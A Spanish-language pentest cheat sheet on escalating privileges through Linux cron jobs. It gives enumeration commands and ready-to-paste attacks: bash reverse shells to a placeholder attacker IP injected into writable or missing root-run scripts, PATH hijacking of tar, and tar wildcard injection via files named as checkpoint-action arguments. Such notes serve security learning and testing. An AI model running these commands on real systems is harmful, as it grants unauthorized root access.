---
title: Tareas Cron en Linux (Escalada de Privilegios)
pubDate: 2026-05-22
---

## ¿Qué son las Tareas Cron?
**Cron** es el servicio encargado de ejecutar comandos o scripts de forma automática en intervalos de tiempo programados (ej: cada minuto, cada día a las 12:00). Se configuran en archivos llamados **crontabs**.

### Riesgos principales
Si una tarea cron es ejecutada por un usuario con privilegios (como `root`) pero el script o la ruta son editables por un usuario normal, el atacante puede inyectar código malicioso que se ejecutará como root.

---

## 🔎 1. Enumeración
Para encontrar tareas cron, revisa estas ubicaciones típicas:

```bash
# Crontab general del sistema (¡El más importante!)
cat /etc/crontab

# Directorios de tareas específicas
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# Ver procesos de cron en tiempo real (requiere pspy)
./pspy64 -pf -i 1000
```

---

## 🚀 2. Vectores de Ataque (Explotación)

### A. Archivo Editable
Si root ejecuta un script sobre el cual tienes permisos de escritura.
1.  **Verifica permisos:** `ls -l /opt/scripts/backup.sh` (busca la `w`).
2.  **Inyecta el comando:**
    ```bash
    echo "bash -i >& /dev/tcp/<TU_IP>/4444 0>&1" >> /opt/scripts/backup.sh
    ```
3.  **Espera:** En un minuto recibirás la shell de root.

### B. Archivo Inexistente (Faltante)
Si el crontab intenta ejecutar un script que no existe (ej: `/home/user/test.sh`), pero tú puedes escribir en esa carpeta.
1.  **Crea el archivo:** `nano /home/user/test.sh`.
2.  **Escribe tu shell:** `#!/bin/bash \n bash -i >& /dev/tcp/<TU_IP>/4444 0>&1`.
3.  **Hazlo ejecutable:** `chmod +x /home/user/test.sh`.

### C. PATH Hijacking
Si el archivo `/etc/crontab` define una variable `PATH` que incluye directorios donde puedes escribir (ej: `/tmp`).
*   **Escenario:** El crontab ejecuta `backup.sh` y este script usa el comando `tar` sin ruta absoluta.
*   **Ataque:** Crea un binario malicioso llamado `tar` en `/tmp` y dale permisos de ejecución. Cron lo ejecutará antes que el `tar` original del sistema.

### D. El Comodín de Tar (Wildcard `*`)
Si una tarea cron ejecuta `tar` sobre todos los archivos de una carpeta donde puedes escribir.
```bash
# El comando de root es: tar czf /tmp/backup.tar.gz *
# Ataque: Creamos archivos con nombres que tar interpreta como parámetros.
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
# En shell.sh pones tu comando malicioso.
```

> **Tip:** Fíjate siempre en la columna de usuario en `/etc/crontab`. Si la tarea la ejecuta `root` y tú puedes manipularla, el juego ha terminado.
